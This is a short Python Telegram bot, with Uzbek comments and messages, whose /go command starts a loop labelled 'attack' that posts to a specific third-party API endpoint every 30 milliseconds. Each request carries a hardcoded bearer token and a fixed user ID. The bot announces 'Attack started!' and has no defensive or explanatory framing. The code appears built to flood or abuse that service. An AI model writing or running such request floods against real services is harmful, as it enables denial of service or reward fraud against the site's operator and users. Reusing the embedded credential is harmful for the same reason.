import telebot
import requests
import threading
import time
import os

# Tokenni Render sozlamalaridan olamiz
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

URL = "https://aladdin.1it.uz/v3/daily/appoint"
HEADERS = {
    'authority': 'aladdin.1it.uz',
    'authorization': 'Bearer _u84j05n0tj59nf94nf3__al983jrskiRo49jml03', 
    'content-type': 'application/json',
    'user-agent': 'Mozilla/5.0'
}
DATA = {"step": 2, "service": "web_app", "userId": 1172260}

is_running = False

def attack():
    global is_running
    while is_running:
        try:
            requests.post(URL, headers=HEADERS, json=DATA, timeout=5)
        except:
            pass
        time.sleep(0.03) # 30ms

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Bot yoniq! /go - boshlash, /stop - to'xtatish")

@bot.message_handler(commands=['go'])
def go(message):
    global is_running
    is_running = True
    threading.Thread(target=attack).start()
    bot.reply_to(message, "Hujum boshlandi! 🚀")

@bot.message_handler(commands=['stop'])
def stop(message):
    global is_running
    is_running = False
    bot.reply_to(message, "To'xtatildi. ✅")

bot.polling(none_stop=True)
